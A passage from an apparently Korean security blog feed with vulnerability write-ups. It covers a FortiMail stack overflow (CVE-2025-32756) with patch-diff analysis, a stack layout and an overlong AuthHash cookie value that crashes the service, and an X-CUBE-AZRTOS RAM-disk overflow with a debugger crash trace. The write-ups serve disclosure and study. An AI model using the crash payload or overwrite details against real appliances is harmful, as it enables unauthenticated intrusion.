&#xC788;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xBCF4;&#xC544; C++&#xB85C; &#xC791;&#xC131;&#xB41C; &#xAC83;&#xC73C;&#xB85C; &#xD655;&#xC778;&#xB429;&#xB2C8;&#xB2E4;. </p><p><img src="/2025/05/29/clalxk/CVE-2025-32756/image2.png" alt="image.png"></p><p><code>FUN_00403b80</code> &#xD568;&#xC218;&#xB97C; &#xC790;&#xC138;&#xD788; &#xB4E4;&#xC5EC;&#xB2E4;&#xBCF4;&#xB358; &#xC911;, &#xBB38;&#xC790;&#xC5F4; <code>APSCOOKIE</code>&#xB97C; &#xBC1C;&#xACAC;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC55E;&#xC11C; &#xC2E4;&#xD589;&#xD55C; <code>curl</code> &#xD14C;&#xC2A4;&#xD2B8;&#xB97C; &#xCC38;&#xACE0;&#xD558;&#xBA74;, &#xC751;&#xB2F5;&#xC5D0;&#xC11C; &#xBC18;&#xD658;&#xB41C; &#xCFE0;&#xD0A4; &#xC911; &#xD558;&#xB098;&#xAC00; &#xBC14;&#xB85C; &#xC774; <code>APSCOOKIE</code> &#xAC12;&#xC774;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/05/29/clalxk/CVE-2025-32756/image3.png" alt="image.png"></p><p>&#xAC1C;&#xBC1C;&#xC790;&#xB3C4;&#xAD6C;&#xC640; Burf Suite &#xB4F1;&#xC744; &#xD1B5;&#xD574; &#xC694;&#xCCAD;&#xC744; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA74; , <code>APSCOOKIE</code> &#xAC12;&#xC744; &#xD3EC;&#xD568;&#xD55C; <code>admin.fe</code> &#xC694;&#xCCAD;&#xC774; &#xAC04;&#xD5D0;&#xC801;&#xC73C;&#xB85C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC73C;&#xBA70;, &#xC774; &#xAC12;&#xC740; &#xC138;&#xC158; &#xAD00;&#xB9AC;&#xB97C; &#xC704;&#xD574; &#xC0AC;&#xC6A9;&#xB418;&#xACE0; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xC774; &#xCFE0;&#xD0A4; &#xAC12;&#xC744; &#xB514;&#xCF54;&#xB529;&#xD558;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;:</p><pre><code class="hljs bash">Era=0&amp;Payload=qCStu1vT3v+Y++5pCCs9M/CxxddCRrC8SHg+9cfRCA42GU7Cf+8p3iBFSl/4vHteSGePZgk7KGMb8kzRR5c2boDUfiiD65jkByiD3DuRCj1NJR7ESpZQIZlOffSxykRbCTp5l3InoU+q6psG+ve+IRDk9za5K0No9T5RNxCwZxM=&amp;AuthHash=kz4cHPsgudYxy4PPp123FUto=&amp;</code></pre><p><code>APSCOOKIE</code>&#xC5D0;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; URL &#xC778;&#xCF54;&#xB529;&#xB41C; &#xD544;&#xB4DC;&#xAC00; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;:</p><ul><li>Era</li><li>Payload</li><li>AuthHash</li></ul><p>&#xC774; &#xAC12;&#xB4E4;&#xC744; <code>grep</code>&#xC744; &#xD1B5;&#xD574; &#xCF54;&#xB4DC; &#xCD94;&#xC801;&#xC5D0; &#xD65C;&#xC6A9;&#xD574;&#xBCF4;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs bash">$ grep -rl <span class="hljs-string">&quot;Era&quot;</span> ./762 | xargs grep -rl <span class="hljs-string">&quot;Payload&quot;</span> | xargs grep -rl <span class="hljs-string">&quot;AuthHash&quot;</span>rootfs/lib/libhttputil.so$ diff 762/rootfs/lib/libhttputil.so 763/rootfs/lib/libhttputil.soBinary files 762/rootfs/lib/libhttputil.so and 763/rootfs/lib/libhttputil.so differ</code></pre><p>&#xC774; &#xAC12;&#xB4E4;&#xC744; &#xD3EC;&#xD568;&#xD558;&#xACE0;, &#xD328;&#xCE58; &#xC804;&#xD6C4; &#xBC84;&#xC804;&#xC5D0;&#xC11C; &#xCC28;&#xC774;&#xAC00; &#xC788;&#xB294; &#xD30C;&#xC77C;&#xC774; &#xD558;&#xB098;&#xBFD0;&#xC774;&#xB77C;&#xB294; &#xC810;&#xC5D0;&#xC11C; &#xBB38;&#xC81C;&#xC758; &#xC6D0;&#xC778;&#xC774; &#xB418;&#xB294; &#xD30C;&#xC77C;&#xC744; &#xCC3E;&#xC740; &#xAC83;&#xC73C;&#xB85C; &#xBCF4;&#xC785;&#xB2C8;&#xB2E4;.</p><hr><h3 id="cookieval-unwrap-&#xD568;&#xC218;-&#xBD84;&#xC11D;"><a href="#cookieval-unwrap-&#xD568;&#xC218;-&#xBD84;&#xC11D;" class="headerlink" title="cookieval_unwrap() &#xD568;&#xC218; &#xBD84;&#xC11D;"></a>cookieval_unwrap() &#xD568;&#xC218; &#xBD84;&#xC11D;</h3><p>Ghidra&#xC5D0; &#xB450; &#xBC84;&#xC804;&#xC744; &#xBAA8;&#xB450; &#xB85C;&#xB4DC;&#xD574;&#xBCF4;&#xB2C8;, &#xC774; &#xBB38;&#xC790;&#xC5F4;&#xB4E4;&#xC774; &#xBAA8;&#xB450; <code>cookieval_unwrap()</code> &#xD568;&#xC218; &#xB0B4;&#xC5D0;&#xC11C; &#xCC38;&#xC870;&#xB418;&#xACE0; &#xC788;&#xC74C;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li><strong>&#xD328;&#xCE58; &#xC804;&#xD6C4; &#xCF54;&#xB4DC; &#xBD84;&#xC11D;</strong></li></ol><p><code>cookieval_unwrap()</code> &#xD568;&#xC218;&#xB97C; &#xD6D1;&#xC5B4;&#xBCF4;&#xBA74;, &#xC774; &#xD568;&#xC218;&#xB294; <code>APSCOOKIE</code>&#xC758; &#xAC01; &#xD544;&#xB4DC;&#xB97C; base64&#xB85C; &#xB514;&#xCF54;&#xB529;&#xD558;&#xACE0;, &#xC774;&#xB97C; &#xC785;&#xB825; &#xBC84;&#xD37C;&#xC5D0; &#xB2E4;&#xC2DC; &#xC4F0;&#xB294; &#xC5ED;&#xD560;&#xC744; &#xD569;&#xB2C8;&#xB2E4;.</p><p><code>Era</code>&#xB294; &#xD55C; &#xC790;&#xB9AC; &#xC22B;&#xC790;&#xB85C; &#xC608;&#xC0C1;&#xB418;&#xBBC0;&#xB85C;, <code>Payload</code>&#xC640; <code>AuthHash</code>&#xC5D0; &#xC9D1;&#xC911;&#xD558;&#xAE30;&#xB85C; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD328;&#xCE58;&#xB41C; &#xBC84;&#xC804;&#xACFC; &#xD328;&#xCE58;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xBC84;&#xC804;&#xC758; &#xB514;&#xCEF4;&#xD30C;&#xC77C; &#xACB0;&#xACFC;&#xB97C; &#xC0B4;&#xD3B4;&#xBCF4;&#xBA70;, &#xAC01;&#xAC01;&#xC758; &#xAC12;&#xC774; &#xC5B4;&#xB5BB;&#xAC8C; &#xCC98;&#xB9AC;&#xB418;&#xB294;&#xC9C0; &#xCD94;&#xC801;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><strong>&#xCDE8;&#xC57D;&#xD55C; &#xBC84;&#xC804;</strong></p><pre><code class="hljs sas">size_t input_size;size_t __size;uchar <span class="hljs-comment">*AuthHash;</span>uchar <span class="hljs-comment">*Payload;</span>long output_buffer [2];out_00 = (uchar <span class="hljs-comment">*)malloc(__size);</span>iVar2 = __isoc99_sscanf(param_1,<span class="hljs-string">&quot;Era=%1d&amp;Payload=%m[^&amp;]&amp;AuthHash=%m[^&amp;]&amp;&quot;</span>,<span class="hljs-variable">&amp;Era</span>,<span class="hljs-variable">&amp;Payload</span>, <span class="hljs-variable">&amp;AuthHash</span>);input_size = strl<span class="hljs-meta">en(</span>(char <span class="hljs-comment">*)AuthHash);</span>__size = strl<span class="hljs-meta">en(</span>(char <span class="hljs-comment">*)Payload);</span>iVar3 = EVP_DecodeU<span class="hljs-meta">pdate(</span>ctx,(uchar <span class="hljs-comment">*)output_buffer,&amp;output_size,AuthHash,(int)input_size);</span>iVar2 = EVP_DecodeU<span class="hljs-meta">pdate(</span>ctx,out_00,<span class="hljs-variable">&amp;local_94</span>,Payload,iVar2);</code></pre><p><strong>&#xD328;&#xCE58;&#xB41C; &#xBC84;&#xC804;</strong></p><pre><code class="hljs sas">size_t input_size;size_t __size;uchar <span class="hljs-comment">*AuthHash;</span>uchar <span class="hljs-comment">*Payload;</span>long output_buffer [2];out_00 = (uchar <span class="hljs-comment">*)malloc(__size);</span>iVar2 = __isoc99_sscanf(param_1,<span class="hljs-string">&quot;Era=%1d&amp;Payload=%m[^&amp;]&amp;AuthHash=%m[^&amp;]&amp;&quot;</span>,<span class="hljs-variable">&amp;Era</span>,<span class="hljs-variable">&amp;Payload</span>, <span class="hljs-variable">&amp;AuthHash</span>);input_size = strl<span class="hljs-meta">en(</span>(char <span class="hljs-comment">*)AuthHash);</span>__size = strl<span class="hljs-meta">en(</span>(char <span class="hljs-comment">*)Payload);</span>input_size = strl<span class="hljs-meta">en(</span>(char <span class="hljs-comment">*)AuthHash);</span><span class="hljs-meta">if</span> (input_size &lt; 0x1e) {iVar3 = EVP_DecodeU<span class="hljs-meta">pdate(</span>ctx,(uchar <span class="hljs-comment">*)output_buffer,&amp;output_size,AuthHash,(int)input_size);</span>iVar2 = EVP_DecodeU<span class="hljs-meta">pdate(</span>ctx,out_00,<span class="hljs-variable">&amp;local_94</span>,Payload,iVar2);</code></pre><p>&#xD328;&#xCE58;&#xB41C; &#xBC84;&#xC804;&#xACFC; &#xCDE8;&#xC57D;&#xD55C; &#xBC84;&#xC804;&#xC758; &#xCC28;&#xC774;&#xB294;, &#xC0AC;&#xC6A9;&#xC790;&#xB85C;&#xBD80;&#xD130; &#xC81C;&#xACF5;&#xB41C; <code>AuthHash</code> &#xAC12;&#xC758; &#xAE38;&#xC774;&#xC5D0; &#xB300;&#xD55C; &#xAC80;&#xC0AC;&#xAC00; &#xCD94;&#xAC00;&#xB418;&#xC5C8;&#xB290;&#xB0D0; &#xC5EC;&#xBD80;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC6D0;&#xB798;(&#xCDE8;&#xC57D;&#xD55C;) &#xBC84;&#xC804;&#xC5D0;&#xC11C;&#xB294; <code>AuthHash</code>&#xAC00; &#xB514;&#xCF54;&#xB529;&#xB418;&#xC5B4; 16&#xBC14;&#xC774;&#xD2B8; &#xD06C;&#xAE30;&#xC758; &#xCD9C;&#xB825; &#xBC84;&#xD37C;&#xC5D0; &#xC4F0;&#xC5EC;&#xC9C0;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD328;&#xCE58;&#xB41C; &#xBC84;&#xC804;&#xC5D0;&#xC11C;&#xB294; &#xD06C;&#xAE30; &#xAC80;&#xC0AC;&#xB97C; &#xD1B5;&#xD574; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; <code>AuthHash</code> &#xD544;&#xB4DC;&#xC5D0; &#xBCF4;&#xB0BC; &#xC218; &#xC788;&#xB294; &#xB370;&#xC774;&#xD130;&#xC758; &#xC591;&#xC744; &#xC81C;&#xD55C;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><code>EVP_DecodeUpdate()</code> &#xD568;&#xC218; &#xD638;&#xCD9C;&#xC5D0;&#xC11C; &#xB514;&#xCF54;&#xB529;&#xB41C; <code>AuthHash</code> &#xAC12;&#xC744; &#xBC84;&#xD37C; &#xD06C;&#xAE30;&#xB97C; &#xB118;&#xACA8;&#xC11C; &#xC4F0;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC2A4;&#xD0DD; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><ol><li><strong>&#xC2A4;&#xD0DD; &#xBD84;&#xC11D;</strong></li></ol><p>&#xCD9C;&#xB825; &#xBC84;&#xD37C;&#xC5D0;&#xC11C; &#xC2DC;&#xC791;&#xB418;&#xB294; &#xC2A4;&#xD0DD; &#xD560;&#xB2F9; &#xC0C1;&#xD0DC;&#xB97C; &#xC0B4;&#xD3B4;&#xBCF4;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs apache"><span class="hljs-attribute">RSP</span>+<span class="hljs-number">0</span>x<span class="hljs-number">50</span> : local_<span class="hljs-number">78</span> (<span class="hljs-number">16</span> bytes)        &lt;- &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0; &#xC2DC;&#xC791; &#xC9C0;&#xC810;<span class="hljs-attribute">RSP</span>+<span class="hljs-number">0</span>x<span class="hljs-number">60</span> : local_<span class="hljs-number">68</span> (<span class="hljs-number">4</span> bytes)         &lt;- &#xB36E;&#xC5B4;&#xC500;<span class="hljs-attribute">RSP</span>+<span class="hljs-number">0</span>x<span class="hljs-number">70</span> : local_<span class="hljs-number">58</span> (<span class="hljs-number">16</span> bytes)        &lt;- &#xB36E;&#xC5B4;&#xC500;<span class="hljs-attribute">RSP</span>+<span class="hljs-number">0</span>x<span class="hljs-number">80</span> : local_<span class="hljs-number">48</span> (<span class="hljs-number">16</span> bytes)        &lt;- &#xB36E;&#xC5B4;&#xC500;<span class="hljs-attribute">RSP</span>+<span class="hljs-number">0</span>x<span class="hljs-number">90</span> : saved RBX                  &lt;- &#xB36E;&#xC5B4;&#xC500;  ---v<span class="hljs-attribute">RSP</span>+<span class="hljs-number">0</span>x<span class="hljs-number">98</span> : saved RBP                  &lt;- &#xB36E;&#xC5B4;&#xC500;<span class="hljs-attribute">RSP</span>+<span class="hljs-number">0</span>xA<span class="hljs-number">0</span> : saved R<span class="hljs-number">12</span>                  &lt;- &#xB36E;&#xC5B4;&#xC500;<span class="hljs-attribute">RSP</span>+<span class="hljs-number">0</span>xA<span class="hljs-number">8</span> : saved R<span class="hljs-number">13</span>                  &lt;- &#xB36E;&#xC5B4;&#xC500;<span class="hljs-attribute">RSP</span>+<span class="hljs-number">0</span>xB<span class="hljs-number">0</span> : saved R<span class="hljs-number">14</span>                  &lt;- &#xB36E;&#xC5B4;&#xC500;<span class="hljs-attribute">RSP</span>+<span class="hljs-number">0</span>xB<span class="hljs-number">8</span> : saved R<span class="hljs-number">15</span>                  &lt;- &#xB36E;&#xC5B4;&#xC500;  ---^<span class="hljs-attribute">RSP</span>+<span class="hljs-number">0</span>xC<span class="hljs-number">0</span> : return address (RIP)       &lt;- &#xB36E;&#xC5B4;&#xC500;</code></pre><p>&#xC2E4;&#xD589;&#xC774; &#xACC4;&#xC18D;&#xB418;&#xB294; &#xB3D9;&#xC548;, &#xC774;&#xB7EC;&#xD55C; &#xC2A4;&#xD0DD; &#xAC12;&#xB4E4;&#xC740; &#xC774;&#xD6C4; <code>memcpy()</code> &#xD638;&#xCD9C; &#xC804;&#xAE4C;&#xC9C0; &#xADF8;&#xB300;&#xB85C; &#xC720;&#xC9C0;&#xB429;&#xB2C8;&#xB2E4;.</p><p><code>memcpy()</code> &#xD638;&#xCD9C;&#xC740; &#xC6B0;&#xB9AC;&#xAC00; &#xC774;&#xBBF8; &#xC81C;&#xC5B4;&#xD560; &#xC218; &#xC788;&#xB294; &#xAC12;&#xB4E4;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xAC8C; &#xB418;&#xBA70;, &#xC774;&#xB294; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xC791;&#xC131;&#xC5D0; &#xC720;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;&#xB9CC;, &#xD568;&#xC218; &#xC5D0;&#xD544;&#xB85C;&#xADF8;&#xC5D0;&#xC11C; RIP&#xB97C; &#xC774;&#xBBF8; &#xC81C;&#xC5B4;&#xD560; &#xC218; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xAE4A;&#xAC8C; &#xD30C;&#xACE0;&#xB4E4; &#xD544;&#xC694;&#xB294; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;.</p><hr><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>&#xBA3C;&#xC800; <code>AuthHash</code>&#xB294; &#xC720;&#xD6A8;&#xD55C; base64 &#xD615;&#xC2DD;&#xC774;&#xC5B4;&#xC57C; &#xD558;&#xBBC0;&#xB85C;, NULL &#xBB38;&#xC790;&#xB4E4;&#xC744; base64&#xB85C; &#xC778;&#xCF54;&#xB529;&#xD574; &#xC804;&#xC1A1;&#xD574;&#xBCF4;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs angelscript">AuthHash%<span class="hljs-number">3</span>DAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%<span class="hljs-number">3</span>D%<span class="hljs-number">3</span>D</code></pre><p><img src="/2025/05/29/clalxk/CVE-2025-32756/image4.png" alt="image.png"></p><p><img src="/2025/05/29/clalxk/CVE-2025-32756/image5.png" alt="image.png"></p><p>&#xBA87; &#xBC88;&#xC758; &#xC2DC;&#xD589;&#xCC29;&#xC624; &#xB05D;&#xC5D0; &#xC704;&#xC640; &#xAC19;&#xC774; &#xACC4;&#xC0B0;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/05/29/clalxk/CVE-2025-32756/image6.png" alt="image.png"></p><p>&#xD06C;&#xB798;&#xC2DC;&#xAC00; &#xBC1C;&#xC0DD;&#xD55C; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. </p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/clalxk/">clalxk</category>
      
      <category domain="https://hackyboiz.github.io/tags/fortinet/">fortinet</category>
      
      <category domain="https://hackyboiz.github.io/tags/FortiMail/">FortiMail</category>
      
      <category domain="https://hackyboiz.github.io/tags/buffer-overflow/">buffer overflow</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2025-32756/">CVE-2025-32756</category>
      
      <category domain="https://hackyboiz.github.io/tags/remote-code-execution/">remote code execution</category>
      
      <category domain="https://hackyboiz.github.io/tags/unauthenticated/">unauthenticated</category>
      
      <category domain="https://hackyboiz.github.io/tags/stack-overflow/">stack overflow</category>
      
      
      <comments>https://hackyboiz.github.io/2025/05/29/clalxk/CVE-2025-32756/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2024-45064: X-CUBE-AZRTOS에서 발생한 Buffer Overflow 취약점</title>
      <link>https://hackyboiz.github.io/2025/05/28/ogu123/cve-2024-45064/</link>
      <guid>https://hackyboiz.github.io/2025/05/28/ogu123/cve-2024-45064/</guid>
      <pubDate>Wed, 28 May 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.talosintelligence.com/vulnerability_rep</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://www.talosintelligence.com/vulnerability_reports/TALOS-2024-2096">https://www.talosintelligence.com/vulnerability_reports/TALOS-2024-2096</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>STMicroelectronics X-CUBE-AZRT-H7RS 1.0.0</li><li>STMicroelectronics X-CUBE-AZRTOS-F7 1.1.0</li><li>STMicroelectronics X-CUBE-AZRTOS-F4 1.1.0</li><li>STMicroelectronics X-CUBE-AZRTOS-G0 1.1.0</li><li>STMicroelectronics X-CUBE-AZRTOS-G4 2.0.0</li><li>STMicroelectronics X-CUBE-AZRTOS-L4 2.0.0</li><li>STMicroelectronics X-CUBE-AZRTOS-L5 2.0.0</li><li>STMicroelectronics X-CUBE-AZRTOS-WB 2.0.0</li><li>STMicroelectronics X-CUBE-AZRTOS-WL 2.0.0</li><li>STMicroelectronics X-CUBE-AZRTOS-H7 3.3.0</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>STMicroelectronics &#xC0AC;&#xC758; X-CUBE-AZRTOS &#xC81C;&#xD488;&#xC5D0;&#xC11C; buffer overflow &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; RAM &#xB514;&#xC2A4;&#xD06C;&#xB97C; &#xC124;&#xC815;&#xD560; &#xB54C; &#xC2E4;&#xC81C; &#xD560;&#xB2F9;&#xB418;&#xB294; RAM &#xB514;&#xC2A4;&#xD06C; size&#xC640; &#xC139;&#xD130; &#xC218;&#xB97C; &#xAC80;&#xC99D;&#xD558;&#xC9C0; &#xC54A;&#xC544;&#xC11C; &#xBC1C;&#xC0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs awk">status = fx_media_format(&amp;ram_disk,    fx_stm32_sram_driver,                <span class="hljs-regexp">//</span> Driver entry                demo.ram_disk_memory,    <span class="hljs-regexp">//</span> RAM disk memory pointer   <span class="hljs-regexp">/*[1] size 4096*/</span>                DataBuffer,              <span class="hljs-regexp">//</span> Media buffer pointer                sizeof(DataBuffer),      <span class="hljs-regexp">//</span> Media buffer size                <span class="hljs-string">&quot;MY_RAM_DISK&quot;</span>,                <span class="hljs-regexp">//</span> Volume Name                <span class="hljs-number">1</span>,                            <span class="hljs-regexp">//</span> Number of FATs                <span class="hljs-number">32</span>,                           <span class="hljs-regexp">//</span> Directory Entries                <span class="hljs-number">0</span>,                            <span class="hljs-regexp">//</span> Hidden sectors                <span class="hljs-number">256</span>,                          <span class="hljs-regexp">//</span> Total sectors    <span class="hljs-regexp">/*[2]*/</span>                <span class="hljs-number">512</span>,                          <span class="hljs-regexp">//</span> Sector size      <span class="hljs-regexp">/*[3]*/</span>                <span class="hljs-number">8</span>,                            <span class="hljs-regexp">//</span> Sectors per cluster                <span class="hljs-number">1</span>,                            <span class="hljs-regexp">//</span> Heads                <span class="hljs-number">1</span>);                           <span class="hljs-regexp">//</span> Sectors per track</code></pre><p>&#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC774; &#xC2DC;&#xC791;&#xB420; &#xB54C;, RAM &#xB514;&#xC2A4;&#xD06C; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; <code>fx_media_format</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xCD08;&#xAE30;&#xD654;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB54C; RAM &#xB514;&#xC2A4;&#xD06C; size&#xB97C; &#xACC4;&#xC0B0;&#xD558;&#xBA74; [2] Total sectors(256) x [3] Sector size(512) = 131,072 byte&#xC774;&#xC9C0;&#xB9CC;, &#xC2E4;&#xC81C; &#xD560;&#xB2F9;&#xC740; [1] size 4096 byte &#xB9CC;&#xD07C; &#xD560;&#xB2F9;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs xl">File: nx_web_http_server.c<span class="hljs-number">4213</span>: VOID  _nx_web_http_server_put_process(NX_WEB_HTTP_SERVER *server_ptr, NX_PACKET *packet_ptr)<span class="hljs-number">4214</span>: {...<span class="hljs-number">4481</span>:         <span class="hljs-comment">/* Write the content found in this packet.  */</span><span class="hljs-number">4482</span>:         <span class="hljs-function"><span class="hljs-title">status</span> =  fx_file_write(&amp;(server_ptr -&gt;</span> <span class="hljs-function"><span class="hljs-title">nx_web_http_server_file</span>), (packet_ptr -&gt;</span> nx_packet_prepend_ptr + offset),<span class="hljs-number">4483</span>:                                 ((ULONG)(<span class="hljs-function"><span class="hljs-title">packet_ptr</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">nx_packet_append_ptr</span> - packet_ptr -&gt;</span> nx_packet_prepend_ptr) - offset));</code></pre><p>NetXDuo HTTP &#xC11C;&#xBC84;&#xB294; <code>PUT</code> &#xC694;&#xCCAD;&#xC744; &#xBC1B;&#xC73C;&#xBA74;, &#xD30C;&#xC77C; &#xB0B4;&#xC6A9;&#xC744; write &#xD558;&#xAE30; &#xC704;&#xD574; <code>fx_file_write</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs angelscript">File: fx_stm32_sram_driver.c<span class="hljs-number">81</span>:         <span class="hljs-keyword">case</span> FX_DRIVER_WRITE:<span class="hljs-number">82</span>:         {<span class="hljs-number">83</span>: <span class="hljs-number">84</span>:             <span class="hljs-comment">/* Calculate the RAM disk sector offset */</span><span class="hljs-number">85</span>:             destination_buffer =  (UCHAR *)FX_SRAM_DISK_BASE_ADDRESS +  <span class="hljs-comment">// [4]</span><span class="hljs-number">86</span>:                                   ((media_ptr-&gt;fx_media_driver_logical_sector +  media_ptr-&gt;fx_media_hidden_sectors) * media_ptr-&gt;fx_media_bytes_per_sector);   <span class="hljs-number">87</span>: <span class="hljs-number">88</span>:             <span class="hljs-comment">/* Copy the source to the RAM sector.  */</span><span class="hljs-number">89</span>:             _fx_utility_memory_copy(media_ptr-&gt;fx_media_driver_buffer, destination_buffer,<span class="hljs-number">90</span>:                                     media_ptr-&gt;fx_media_driver_sectors * media_ptr-&gt;fx_media_bytes_per_sector); <span class="hljs-number">91</span>: <span class="hljs-number">92</span>:             <span class="hljs-comment">/* Successful driver request.  */</span><span class="hljs-number">93</span>:             media_ptr -&gt; fx_media_driver_status =  FX_SUCCESS;<span class="hljs-number">94</span>:             <span class="hljs-keyword">break</span>;<span class="hljs-number">95</span>:         }</code></pre><p><code>fx_file_write</code> &#xD568;&#xC218; &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; fx_stm32_sram_driver.c &#xD30C;&#xC77C;&#xC5D0; &#xC788;&#xB294; RAM &#xB514;&#xC2A4;&#xD06C; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC758; <code>FX_DRIVER_WRITE</code>&#xC744; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;.</p><p><code>FX_DRIVER_WRITE</code>&#xC740; destination_buffer&#xC744; &#xACC4;&#xC0B0;&#xD574; &#xD30C;&#xC77C; &#xB370;&#xC774;&#xD130;&#xB97C; RAM &#xB514;&#xC2A4;&#xD06C;&#xC5D0; write &#xD569;&#xB2C8;&#xB2E4;. </p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; [4] destination_buffer &#xC8FC;&#xC18C;&#xB97C; &#xACC4;&#xC0B0;&#xD560; &#xB54C;, media_ptr-&gt;fx_media_driver_logical_sector &#xAC12;&#xC774;  Total sectors &#xC218;(256) &#xB9CC;&#xD07C; &#xC99D;&#xAC00;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; [1]&#xC5D0;&#xC11C; &#xD560;&#xB2F9;&#xB41C; 4096 byte&#xB97C; &#xB118;&#xC5B4; buffer overflow &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs angelscript">File: fx_utility_memory_copy.c<span class="hljs-number">82</span>: VOID  _fx_utility_memory_copy(UCHAR *source_ptr, UCHAR *dest_ptr, ULONG size)<span class="hljs-number">83</span>: {<span class="hljs-number">84</span>: <span class="hljs-number">85</span>:     <span class="hljs-comment">/* Copy the memory.  */</span><span class="hljs-number">86</span>:     memcpy(dest_ptr, source_ptr, size); <span class="hljs-comment">/* Use case of memcpy is verified. */</span><span class="hljs-number">87</span>: }</code></pre><p><code>_fx_utility_memory_copy</code> &#xD568;&#xC218;&#xC5D0;&#xC11C;&#xB3C4; &#xAC80;&#xC99D; &#xC5C6;&#xC774; <code>memcpy</code> &#xD568;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs apache"><span class="hljs-attribute">Program</span> received signal SIGTRAP, Trace/breakpoint trap.<span class="hljs-attribute">MemManage_Handler</span> () at ../Core/Src/stm<span class="hljs-number">32</span>f<span class="hljs-number">7</span>xx_it.c:<span class="hljs-number">102</span><span class="hljs-attribute">102</span>{<span class="hljs-attribute">bt</span><span class="hljs-comment">#0  MemManage_Handler () at ../Core/Src/stm32f7xx_it.c:102</span><span class="hljs-comment">#1  &lt;signal handler called&gt;</span><span class="hljs-comment">#2  0x41414140 in ?? ()</span><span 